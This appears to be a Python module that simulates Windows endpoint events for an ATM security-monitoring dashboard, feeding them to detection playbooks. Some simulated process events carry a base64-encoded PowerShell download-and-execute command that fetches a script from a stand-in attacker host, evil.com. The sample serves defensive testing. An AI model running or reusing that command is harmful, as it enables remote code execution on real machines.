import asyncio
import random
import time
import base64
from src.backend.connection_manager import manager
from src.backend.playbooks import evaluate_playbooks

async def run_endpoint_simulator():
    """
    Simulates Windows Host Events (Event ID 4688, 11, etc.)
    and pushes them via websocket.
    """
    while True:
        await asyncio.sleep(random.uniform(3.0, 10.0))
        
        event_types = ["ProcessCreation", "FileCreate", "UEBA_Anomaly"]
        chosen = random.choice(event_types)
        
        atm_id = random.choice(["ATM-01", "ATM-02", "ATM-03", "ATM-04", "ATM-99-HONEYPOT"])
        host_ip = f"192.168.1.10{atm_id[-1]}"
        event_data = {
            "timestamp": int(time.time() * 1000),
            "host_ip": host_ip
        }

        if chosen == "ProcessCreation":
            # 30% chance of being malicious powershell
            if random.random() < 0.3:
                b64_payload = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')").decode()
                cmd = f"powershell.exe -enc {b64_payload}"
            else:
                cmds = ["C:\\Windows\\System32\\svchost.exe -k netsvcs", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\cmd.exe /c echo hello"]
                cmd = random.choice(cmds)

            event_data.update({
                "event_id": 4688,
                "process_name": cmd.split()[0],
                "command_line": cmd
            })
        elif chosen == "FileCreate":
            cmd = f"FileCreate C:\\Windows\\Temp\\random_{random.randint(1000, 9999)}.tmp"
            event_data.update({
                "event_id": 11,
                "file_name": f"C:\\Windows\\Temp\\random_{random.randint(1000, 9999)}.tmp",
                "command_line": cmd
            })
        else:
            cmd = "UEBA Anomaly Login"
            event_data.update({
                "event_id": 4624,
                "message": "Admin login outside business hours",
                "risk_score": 95
            })

        payload = {
            "type": "endpoint_event",
            "endpointId": atm_id,
            "command": cmd,
            "event": event_data
        }
        
        # We evaluate playbooks on this simulated event directly here
        await evaluate_playbooks(payload)
        
        # Broadcast the simulated endpoint event
        await manager.broadcast(payload)
